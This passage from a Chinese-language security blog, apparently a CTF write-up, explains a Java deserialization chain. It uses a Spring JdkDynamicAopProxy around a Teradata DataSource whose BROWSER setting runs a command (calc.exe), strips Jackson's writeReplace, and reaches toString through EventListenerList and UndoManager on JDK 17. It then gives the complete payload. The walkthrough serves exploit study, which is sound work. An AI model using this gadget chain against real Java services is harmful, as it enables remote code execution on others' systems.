+<p>当代理类上的一个接口方<span class="hexo-wm">s​﻿𝟯𝒗ｅ𝐧·​﻿ѕⅈ‍​𝘵𝐞‍﻿</span>法被调用时，这个&nbsp;<code>handler</code>&nbsp;就会尝试调用&nbsp;<code>targetSource</code>&nbsp;成员保存的实现类对象所实现的对应方法。所以需要获取代理类所有的&nbsp;<code>getter</code>&nbsp;方法，然后调用代理的&nbsp;<code>getter</code>&nbsp;方法，触发&nbsp;JdkDyna<span class="hexo-wm">ѕ​﻿⑶𝘷e𝘯．‌𝘀𝘪﻿‌𝐭𝘦﻿​</span>micAopProxy&nbsp;类的&nbsp;<code>invoke</code>&nbsp;方法</p>
+</blockquote>
+<blockquote>
+<p>同时应该注意到，当我们使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法，<span class="hexo-wm">ꜱ‍​𝟯ⅴ𝐞n∙﻿﻿𝘀𝘪﻿‌ｔ𝐞​‍</span>我们的目的应该是让代理类仅仅包含我们需要的方法 <code>getConnection()</code> 来触发 jdbc 连接</p>
+</blockquote>
+<p><img src="image-16.png" alt="image-16.png"></p>
+<p>由于 DataSource 代理类包含我们需要的 <code>getConnection()</code> 方法，因此我们可以使用这个代理类来稳定触发反序列化：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">AdvisedSupport</span> advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Object</span> proxy <span class="token operator">=</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>最终 Payload：</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// Teradata 恶意 dataSource 构造</span>
+<span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">"calc.exe"</span><span class="token punctuation">;</span>
+<span class="token class-name">TeraDataSource</span> dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TeraDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setBROWSER</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setLOGMECH</span><span class="token punctuation">(</span><span class="token string">"BROWSER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setDSName</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dataSource<span class="token punctuation">.</span><span class="token function">setDbsPort</span><span class="token punctuation">(</span><span class="token string">"10250"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 代理类实现稳定触发 getConnection</span>
+<span class="token class-name">AdvisedSupport</span> advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Object</span> proxy <span class="token operator">=</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 删除 writeReplace 解决 Jackson 反序列化不稳定问题</span>
+<span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">CtMethod</span> writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">POJONode</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// jdk17 从 readObject 到 obj.toString 构造</span>
+<span class="token class-name">EventListenerList</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventListenerList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">UndoManager</span> manager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UndoManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">Vector</span> vector <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token punctuation">)</span> <span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span>manager<span class="token punctuation">,</span> <span class="token string">"edits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+vector<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"listenerList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">InternalError</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> manager<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">serial</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../2024-sbctf-web-official-writeup/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../../skill/crlf-%E6%B3%A8%E5%85%A5/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Javolution"><span class="toc-text">Javolution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%83%A8%E5%88%86%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-text">反序列化部分入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-text">一、整数溢出漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81host-%E7%BB%95%E8%BF%87"><span class="toc-text">二、host 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%83%A8%E5%88%86"><span class="toc-text">三、反序列化部分</span></a></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
